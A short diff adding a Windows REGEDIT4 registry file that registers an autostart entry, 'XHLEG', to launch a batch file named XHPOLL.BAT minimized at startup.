@@ -1,0 +1,5 @@
+REGEDIT4
+
+[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
+"XHLEG"="C:\\WINDOWS\\COMMAND\\START.EXE /m C:\\XHLEG\\XHPOLL.BAT"
+
